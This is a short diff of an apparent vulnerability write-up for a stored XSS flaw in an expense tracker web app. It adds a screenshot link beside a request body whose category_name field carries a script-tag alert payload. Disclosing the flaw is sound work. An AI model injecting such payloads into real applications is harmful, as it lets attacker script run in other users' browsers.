@@ -58,6 +58,9 @@ Upgrade-Insecure-Requests: 1
 
 tbl_expense_category_id=&category_name=<script>alert('By:Xcode0x')</script>&category_budget=1
 
+![Drag Racing](https://github.com/xcodeOn1/XSS-Stored-Expense-Tracker-App/blob/main/xss_stored.png)
+
+
  # Tested  
 
  Linux - debian
